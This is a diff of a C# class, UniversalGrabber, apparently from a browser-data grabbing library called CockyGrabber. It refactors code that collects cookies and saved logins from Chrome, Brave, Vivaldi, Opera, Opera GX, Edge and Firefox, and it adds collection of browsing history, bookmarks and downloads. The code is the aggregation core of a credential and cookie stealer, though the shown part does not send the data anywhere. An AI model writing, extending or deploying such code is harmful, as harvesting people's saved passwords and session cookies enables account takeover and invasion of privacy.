@@ -1,59 +1,34 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 
 namespace CockyGrabber.Grabbers
 {
     public class UniversalGrabber
     {
-        #region Grabbers
-        public ChromeGrabber CG { get; set; }
-        public BraveGrabber BG { get; set; }
-        public VivaldiGrabber VG { get; set; }
-        public OperaGrabber OG { get; set; }
-        public OperaGxGrabber OGG { get; set; }
-        public EdgeGrabber EG { get; set; }
-        public FirefoxGrabber FG { get; set; }
-        #endregion
-
-        public UniversalGrabber()
+        private readonly BlinkGrabber[] BlinkGrabbers =
         {
-            CG = new ChromeGrabber();
-            BG = new BraveGrabber();
-            VG = new VivaldiGrabber();
-            OG = new OperaGrabber();
-            OGG = new OperaGxGrabber();
-            EG = new EdgeGrabber();
-            FG = new FirefoxGrabber();
-        }
-        public UniversalGrabber(ChromeGrabber cg, BraveGrabber bg, VivaldiGrabber vg, OperaGrabber og, OperaGxGrabber ogg, EdgeGrabber eg, FirefoxGrabber fg)
+            new ChromeGrabber(),
+            new BraveGrabber(),
+            new VivaldiGrabber(),
+            new OperaGrabber(),
+            new OperaGxGrabber(),
+            new EdgeGrabber(),
+        };
+        private readonly GeckoGrabber[] GeckoGrabbers =
         {
-            CG = cg;
-            BG = bg;
-            VG = vg;
-            OG = og;
-            OGG = ogg;
-            EG = eg;
-            FG = fg;
-        }
+            new FirefoxGrabber(),
+        };
 
         #region GetCookies()
-        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.CookieHeader by, object value)
+        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.Cookie.Header by, object value)
         {
             List<Blink.Cookie> cookies = new List<Blink.Cookie>();
 
-            // Add Cookies to list:
-            if (CG.CookiesExist())
-                cookies.AddRange(CG.GetCookiesBy(by, value));
-            if (BG.CookiesExist())
-                cookies.AddRange(BG.GetCookiesBy(by, value));
-            if (VG.CookiesExist())
-                cookies.AddRange(VG.GetCookiesBy(by, value));
-            if (OG.CookiesExist())
-                cookies.AddRange(OG.GetCookiesBy(by, value));
-            if (OGG.CookiesExist())
-                cookies.AddRange(OGG.GetCookiesBy(by, value));
-            if (EG.CookiesExist())
-                cookies.AddRange(EG.GetCookiesBy(by, value));
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Cookies to list:
+                if (g.CookiesExist())
+                    cookies.AddRange(g.GetCookiesBy(by, value));
+            }
 
             return cookies;
         }
@@ -61,45 +36,53 @@ namespace CockyGrabber.Grabbers
         {
             List<Blink.Cookie> cookies = new List<Blink.Cookie>();
 
-            // Add Cookies to list:
-            if (CG.CookiesExist())
-                cookies.AddRange(CG.GetCookies());
-            if (BG.CookiesExist())
-                cookies.AddRange(BG.GetCookies());
-            if (VG.CookiesExist())
-                cookies.AddRange(VG.GetCookies());
-            if (OG.CookiesExist())
-                cookies.AddRange(OG.GetCookies());
-            if (OGG.CookiesExist())
-                cookies.AddRange(OGG.GetCookies());
-            if (EG.CookiesExist())
-                cookies.AddRange(EG.GetCookies());
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Cookies to list:
+                if (g.CookiesExist())
+                    cookies.AddRange(g.GetCookies());
+            }
 
             return cookies;
         }
 
-        public Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>> GetAllCookies()
-            => new Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>>(GetAllBlinkCookies(), FG.GetCookies());
+        public IEnumerable<Gecko.Cookie> GetAllGeckoCookiesBy(Gecko.Cookie.Header by, object value)
+        {
+            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Cookies to list:
+                cookies.AddRange(g.GetCookiesBy(by, value));
+            }
+
+            return cookies;
+        }
+        public IEnumerable<Gecko.Cookie> GetAllGeckoCookies()
+        {
+            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Cookies to list:
+                cookies.AddRange(g.GetCookies());
+            }
+
+            return cookies;
+        }
         #endregion
 
         #region GetLogins()
-        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.LoginHeader by, object value)
+        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.Login.Header by, object value)
         {
             List<Blink.Login> logins = new List<Blink.Login>();
 
-            // Add Logins to list:
-            if (CG.CookiesExist())
-                logins.AddRange(CG.GetLoginsBy(by, value));
-            if (BG.CookiesExist())
-                logins.AddRange(BG.GetLoginsBy(by, value));
-            if (VG.CookiesExist())
-                logins.AddRange(VG.GetLoginsBy(by, value));
-            if (OG.CookiesExist())
-                logins.AddRange(OG.GetLoginsBy(by, value));
-            if (OGG.CookiesExist())
-                logins.AddRange(OGG.GetLoginsBy(by, value));
-            if (EG.CookiesExist())
-                logins.AddRange(EG.GetLoginsBy(by, value));
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Logins to list:
+                if (g.LoginsExist())
+                    logins.AddRange(g.GetLoginsBy(by, value));
+            }
 
             return logins;
         }
@@ -107,25 +90,202 @@ namespace CockyGrabber.Grabbers
         {
             List<Blink.Login> logins = new List<Blink.Login>();
 
-            // Add Logins to list:
-            if (CG.CookiesExist())
-                logins.AddRange(CG.GetLogins());
-            if (BG.CookiesExist())
-                logins.AddRange(BG.GetLogins());
-            if (VG.CookiesExist())
-                logins.AddRange(VG.GetLogins());
-            if (OG.CookiesExist())
-                logins.AddRange(OG.GetLogins());
-            if (OGG.CookiesExist())
-                logins.AddRange(OGG.GetLogins());
-            if (EG.CookiesExist())
-                logins.AddRange(EG.GetLogins());
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Logins to list:
+                if (g.LoginsExist())
+                    logins.AddRange(g.GetLogins());
+            }
 
             return logins;
         }
 
-        public Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>> GetAllLogins()
-            => new Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>>(GetAllBlinkLogins(), FG.GetLogins());
+        public IEnumerable<Gecko.Login> GetAllGeckoLoginsBy(Gecko.Login.Header by, object value)
+        {
+            List<Gecko.Login> logins = new List<Gecko.Login>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Logins to list:
+                logins.AddRange(g.GetLoginsBy(by, value));
+            }
+
+            return logins;
+        }
+        public IEnumerable<Gecko.Login> GetAllGeckoLogins()
+        {
+            List<Gecko.Login> logins = new List<Gecko.Login>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Logins to list:
+                logins.AddRange(g.GetLogins());
+            }
+
+            return logins;
+        }
+        #endregion
+
+        #region GetHistory()
+        public IEnumerable<Blink.Site> GetAllBlinkHistoriesBy(Blink.Site.Header by, object value)
+        {
+            List<Blink.Site> sites = new List<Blink.Site>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Sites to list:
+                if (g.HistoryExist())
+                    sites.AddRange(g.GetHistoryBy(by, value));
+            }
+
+            return sites;
+        }
+        public IEnumerable<Blink.Site> GetAllBlinkHistories()
+        {
+            List<Blink.Site> sites = new List<Blink.Site>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Sites to list:
+                if (g.HistoryExist())
+                    sites.AddRange(g.GetHistory());
+            }
+
+            return sites;
+        }
+
+        public IEnumerable<Gecko.Site> GetAllGeckoHistoriesBy(Gecko.Site.Header by, object value)
+        {
+            List<Gecko.Site> sites = new List<Gecko.Site>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Sites to list:
+                sites.AddRange(g.GetHistoryBy(by, value));
+            }
+
+            return sites;
+        }
+        public IEnumerable<Gecko.Site> GetAllGeckoHistories()
+        {
+            List<Gecko.Site> sites = new List<Gecko.Site>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Sites to list:
+                sites.AddRange(g.GetHistory());
+            }
+
+            return sites;
+        }
+        #endregion
+
+        #region GetBookmarks()
+        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarksBy(Blink.Bookmark.Header by, object value)
+        {
+            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Bookmarks to list:
+                if (g.BookmarksExist())
+                    bookmarks.AddRange(g.GetBookmarksBy(by, value));
+            }
+
+            return bookmarks;
+        }
+        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarks()
+        {
+            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Bookmarks to list:
+                if (g.BookmarksExist())
+                    bookmarks.AddRange(g.GetBookmarks());
+            }
+
+            return bookmarks;
+        }
+
+        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarksBy(Gecko.Bookmark.Header by, object value)
+        {
+            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Bookmarks to list:
+                bookmarks.AddRange(g.GetBookmarksBy(by, value));
+            }
+
+            return bookmarks;
+        }
+        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarks()
+        {
+            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Bookmarks to list:
+                bookmarks.AddRange(g.GetBookmarks());
+            }
+
+            return bookmarks;
+        }
+        #endregion
+
+        #region GetDownloads()
+        public IEnumerable<Blink.Download> GetAllBlinkDownloadsBy(Blink.Download.Header by, object value)
+        {
+            List<Blink.Download> downloads = new List<Blink.Download>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Downloads to list:
+                if (g.HistoryExist())
+                    downloads.AddRange(g.GetDownloadsBy(by, value));
+            }
+
+            return downloads;
+        }
+        public IEnumerable<Blink.Download> GetAllBlinkDownloads()
+        {
+            List<Blink.Download> downloads = new List<Blink.Download>();
+
+            foreach (BlinkGrabber g in BlinkGrabbers)
+            {
+                // Add Downloads to list:
+                if (g.HistoryExist())
+                    downloads.AddRange(g.GetDownloads());
+            }
+
+            return downloads;
+        }
+
+        public IEnumerable<Gecko.Download> GetAllGeckoDownloadsBy(Gecko.Download.Header by, object value)
+        {
+            List<Gecko.Download> downloads = new List<Gecko.Download>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Downloads to list:
+                downloads.AddRange(g.GetDownloadsBy(by, value));
+            }
+
+            return downloads;
+        }
+        public IEnumerable<Gecko.Download> GetAllGeckoDownloads()
+        {
+            List<Gecko.Download> downloads = new List<Gecko.Download>();
+
+            foreach (GeckoGrabber g in GeckoGrabbers)
+            {
+                // Add Downloads to list:
+                downloads.AddRange(g.GetDownloads());
+            }
+
+            return downloads;
+        }
         #endregion
     }
 }
